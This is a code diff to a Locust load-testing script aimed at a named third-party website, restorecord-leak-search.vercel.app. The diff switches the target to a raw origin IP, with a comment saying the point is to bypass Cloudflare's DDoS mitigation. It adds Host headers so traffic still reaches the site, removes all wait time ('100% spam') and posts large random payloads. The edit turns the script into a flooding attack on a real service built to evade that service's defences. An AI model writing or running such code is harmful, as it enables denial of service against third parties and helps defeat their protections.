@@ -27,6 +27,7 @@ class UserBehavior(TaskSet):
             "ip:192.168.0.1",
         ])
         headers = {
+            "Host": "restorecord-leak-search.vercel.app",
             "Cache-Control": "no-cache",
             "Pragma": "no-cache",
             "X-Debug-Nonce": uuid.uuid4().hex,
@@ -39,12 +40,14 @@ class UserBehavior(TaskSet):
     def heavy_api(self):
         # Push the heavy backend endpoint
         payload = {"data": "x" * random.randint(1000, 10000)}
+        headers = {"Host": "restorecord-leak-search.vercel.app"}
         self.client.post(
-            "/api/process", json=payload, name="POST /api/process"
+            "/api/process", json=payload, headers=headers, name="POST /api/process"
         )
 
 class WebsiteUser(HttpUser):
-    host = "https://restorecord-leak-search.vercel.app"
+    # Use the raw origin IP to bypass Cloudflare's DDoS mitigation
+    host = "http://64.29.17.3"
     tasks = [UserBehavior]
     # No think time - 100% spam
     wait_time = constant(0)
